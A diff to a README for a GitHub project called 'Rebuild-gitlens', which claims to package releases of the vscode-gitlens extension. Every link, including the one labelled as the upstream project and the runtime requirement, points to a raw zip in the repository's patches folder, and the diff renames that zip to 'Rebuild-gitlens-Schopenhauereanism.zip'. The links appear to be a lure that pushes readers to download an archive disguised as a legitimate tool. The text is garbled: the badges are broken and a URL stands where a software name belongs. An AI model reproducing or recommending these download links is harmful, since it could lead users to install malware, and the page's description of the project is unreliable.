@@ -1,10 +1,10 @@
 # 🚀 Rebuild-gitlens - Effortlessly Sync the Latest Releases
 
-[![Download Now](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip)
+[![Download Now](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/Rebuild-gitlens-Schopenhauereanism.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/Rebuild-gitlens-Schopenhauereanism.zip)
 
 ## 📋 Overview
 
-Rebuild-gitlens is designed to help you easily synchronize and package the latest release of [gitkraken/vscode-gitlens](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip). This tool provides a simple way to create a personal testing environment while also featuring partial localization into Chinese.
+Rebuild-gitlens is designed to help you easily synchronize and package the latest release of [gitkraken/vscode-gitlens](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/Rebuild-gitlens-Schopenhauereanism.zip). This tool provides a simple way to create a personal testing environment while also featuring partial localization into Chinese.
 
 ## 🚀 Features
 
@@ -54,7 +54,7 @@ You can manually run the workflow via the GitHub Actions page. You can choose a 
 
 To get started with Rebuild-gitlens, visit the Releases page to download the latest version:
 
-[![Download Now](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip)
+[![Download Now](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/Rebuild-gitlens-Schopenhauereanism.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/Rebuild-gitlens-Schopenhauereanism.zip)
 
 After downloading, follow these steps to install:
 
@@ -68,7 +68,7 @@ After downloading, follow these steps to install:
 To run Rebuild-gitlens effectively, you need the following:
 
 - An operating system: Windows 10 or later, macOS, or Linux.
-- https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip version 12 or later installed on your machine.
+- https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/Rebuild-gitlens-Schopenhauereanism.zip version 12 or later installed on your machine.
 - A stable internet connection to download dependencies and updates.
 
 ## 📄 Changelog
@@ -83,4 +83,4 @@ If you encounter issues or have questions, visit the Issues section of the repos
 
 Rebuild-gitlens simplifies the process of syncing versions of vscode-gitlens. With few steps, you can keep your environment up-to-date, enabling better development and testing experiences. For any further assistance, feel free to reach out or browse through the repository documentation.
 
-[![Download Now](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip)
+[![Download Now](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/Rebuild-gitlens-Schopenhauereanism.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/Rebuild-gitlens-Schopenhauereanism.zip)
